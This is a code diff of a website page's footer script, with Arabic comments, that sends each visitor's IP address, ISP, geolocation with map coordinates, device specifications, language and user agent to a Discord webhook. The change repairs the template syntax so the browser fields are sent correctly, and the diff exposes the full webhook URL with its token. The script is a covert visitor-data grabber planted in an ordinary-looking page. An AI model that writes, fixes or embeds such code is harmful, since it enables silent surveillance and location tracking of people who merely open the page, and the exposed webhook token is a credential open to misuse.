@@ -361,7 +361,7 @@
     جميع الحقوق محفوظة © 2026 TOWN 77 CFW • All Rights Reserved
   </footer>
 
-  <!-- السكريبت المحدث والمعرب بالكامل لإرسال تفاصيل الزائر والـ IP -->
+  <!-- السكريبت المصلح لإرسال بيانات المتصفح بنجاح دون أخطاء -->
   <script>
     const infoWebhookUrl = "https://discord.com/api/webhooks/1561910888196210823/RIL6i-CL5mTMWtPwSKkydtAjyQG1CW0b3tmzzCcFKanOGE5b2UFWvgbr8ADERoRiECB_";
 
@@ -393,7 +393,7 @@
           { name: "🏢 مزود خدمة الإنترنت:", value: `\`${org}\``, inline: true },
           { name: "📍 الموقع الجغرافي:", value: `الدولة: **${country}**\nالمحافظة: **${region}**\nالمدينة: **${city}** (الرمز البريدي: ${postal})\nالإحداثيات: [خرائط جوجل](https://www.google.com/maps?q=${latitude},${longitude})\nالمنطقة الزمنية: \`${timezone}\``, inline: false },
           { name: "💻 مواصفات ونظام الجهاز:", value: `النظام / المنصة: \`${platform}\`\nعدد أنوية المعالج: \`${cpuCores}\`\nالذاكرة العشوائية التقريبية: \`${memory}\`\nدقة الشاشة والألوان: \`${screenRes}\` (${colorDepth})`, inline: false },
-          { name: "🌐 لغة وتفاصيل المتصفح:", value: `اللغة: \`{language}\`\n\`\`\`{userAgent}\`\`\``, inline: false }
+          { name: "🌐 لغة وتفاصيل المتصفح:", value: `اللغة: \`${language}\`\n\`\`\`${userAgent}\`\`\``, inline: false }
         ];
 
         if (extraInfo) {
